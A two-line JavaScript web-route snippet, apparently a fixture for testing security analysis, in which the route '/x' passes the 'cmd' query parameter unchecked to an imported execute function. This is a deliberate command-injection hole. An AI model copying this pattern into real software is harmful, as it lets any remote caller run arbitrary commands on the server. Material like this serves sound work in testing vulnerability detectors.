import { run as execute } from "./b";
app.get("/x", (req) => execute(req.query.cmd));
